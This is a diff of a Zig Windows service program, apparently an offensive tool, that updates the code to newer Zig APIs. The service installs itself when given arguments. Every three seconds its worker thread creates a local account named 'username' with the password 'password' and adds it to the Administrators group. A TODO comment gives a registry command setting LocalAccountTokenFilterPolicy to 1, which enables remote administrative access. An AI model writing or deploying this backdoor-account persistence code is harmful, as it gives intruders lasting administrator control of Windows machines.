@@ -11,32 +11,30 @@ const win32 = @import("win32").everything;
 const windows = std.os.windows;
 
 const SERVICE_NAME = "tester";
+
 var svc_status: win32.SERVICE_STATUS = std.mem.zeroes(win32.SERVICE_STATUS);
 var svc_status_handle: ?win32.SERVICE_STATUS_HANDLE = null;
 var svc_stop_event: ?win32.HANDLE = win32.INVALID_HANDLE_VALUE;
 
-pub fn main() !void {
-    // var gpa = std.heap.GeneralPurposeAllocator(.{}){};
-    // const allocator = gpa.allocator();
-    // defer _ = gpa.deinit();
-    //
-    // // Parse args into string array (error union needs 'try')
-    // const args = try std.process.argsAlloc(allocator);
-    // defer std.process.argsFree(allocator, args);
-    //
-    // if (args.len > 1) {
-    //     utility.InstallService(
-    //         null,
-    //         null,
-    //         null,
-    //     );
-    //     return;
-    // }
+pub fn main(init: std.process.Init) !void {
+    var gpa = std.heap.DebugAllocator(.{}){};
+    defer _ = gpa.deinit();
+
+    const args = try init.minimal.args.toSlice(init.arena.allocator());
+
+    if (args.len > 1) {
+        utility.InstallService(
+            args[1],
+            args[1],
+            args[0],
+        );
+        return;
+    }
 
     win32.OutputDebugStringA("service adduser main...");
 
     var table: [1]win32.SERVICE_TABLE_ENTRYA = std.mem.zeroes([1]win32.SERVICE_TABLE_ENTRYA);
-    table[0].lpServiceName = @constCast(@ptrCast(&""));
+    table[0].lpServiceName = @ptrCast(@constCast(&""));
     table[0].lpServiceProc = svc_main;
 
     // https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicectrldispatchera
@@ -48,7 +46,7 @@ pub fn main() !void {
 fn svc_main(
     _: u32,
     _: ?*?win32.PSTR,
-) callconv(@import("std").os.windows.WINAPI) void {
+) callconv(.winapi) void {
     win32.OutputDebugStringA("svc_main called...");
 
     // https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-registerservicectrlhandlera
@@ -116,7 +114,7 @@ fn svc_main(
     if (win32.WaitForSingleObject(
         thread,
         win32.INFINITE,
-    ) == @intFromEnum(win32.WAIT_FAILED)) {
+    ) == win32.WAIT_FAILED) {
         win32.OutputDebugStringA("svc_main failed - WaitForSingleObject failed ...");
         return;
     }
@@ -140,7 +138,7 @@ fn svc_main(
 
 fn svc_ctrl_handler(
     dwControl: u32,
-) callconv(@import("std").os.windows.WINAPI) void {
+) callconv(.winapi) void {
     win32.OutputDebugStringA("svc_ctrl_handler called...");
 
     switch (dwControl) {
@@ -171,9 +169,9 @@ fn svc_ctrl_handler(
 
 fn svc_worker_thread(
     _: ?windows.LPVOID,
-) callconv(@import("std").os.windows.WINAPI) windows.DWORD {
+) callconv(.winapi) windows.DWORD {
     // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
-    while (win32.WaitForSingleObject(svc_stop_event.?, 0) != @intFromEnum(win32.WAIT_OBJECT_0)) {
+    while (win32.WaitForSingleObject(svc_stop_event.?, 0) != win32.WAIT_OBJECT_0) {
         win32.OutputDebugStringA("svc_worker_thread running...");
         win32.Sleep(3000);
         _ = exec();
@@ -182,21 +180,21 @@ fn svc_worker_thread(
     return @intFromEnum(win32.ERROR_SUCCESS);
 }
 
-fn exec() i32 {
-    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
+fn exec() windows.DWORD {
+    var gpa = std.heap.DebugAllocator(.{}){};
     const allocator = gpa.allocator();
     defer _ = gpa.deinit();
 
     const pszUsername = std.unicode.utf8ToUtf16LeAllocZ(allocator, "username") catch {
-        return -1;
+        return 1;
     };
     defer allocator.free(pszUsername);
     const pszPassword = std.unicode.utf8ToUtf16LeAllocZ(allocator, "password") catch {
-        return -2;
+        return 2;
     };
     defer allocator.free(pszPassword);
     const pszGroup = std.unicode.utf8ToUtf16LeAllocZ(allocator, "Administrators") catch {
-        return -3;
+        return 3;
     };
     defer allocator.free(pszGroup);
 
@@ -245,5 +243,5 @@ fn exec() i32 {
 
     // TODO: REG ADD HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 
-    return windows.TRUE;
+    return 0;
 }
